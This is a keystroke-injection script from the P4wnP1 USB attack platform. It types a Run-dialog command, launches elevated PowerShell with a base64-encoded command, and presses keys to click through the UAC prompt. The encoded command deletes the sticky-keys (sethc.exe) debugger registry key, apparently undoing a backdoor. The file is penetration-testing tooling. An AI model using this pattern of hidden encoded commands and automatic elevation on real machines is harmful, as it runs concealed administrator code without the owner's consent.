//    This file is part of P4wnP1.
//
//    Copyright (c) 2017, Marcus Mengs.
//
//    P4wnP1 is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    P4wnP1 is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.

layout('us');
press("GUI r");
delay(500);
type("powershell.exe\n")
delay(1000);

type("start powershell -verb runas -A '-e','IwBmAG8AcgAgAFAANAB3AG4AUAAxACAAYgB5ACAATQBhAE0AZQA4ADIACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAiAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEkAbQBhAGcAZQAgAEYAaQBsAGUAIABFAHgAZQBjAHUAdABpAG8AbgAgAE8AcAB0AGkAbwBuAHMAXABzAGUAdABoAGMALgBlAHgAZQAiADsAZQB4AGkAdAA=';exit")
press("ENTER");
delay(500);

press("SHIFT TAB");
delay(100);
press("ENTER");
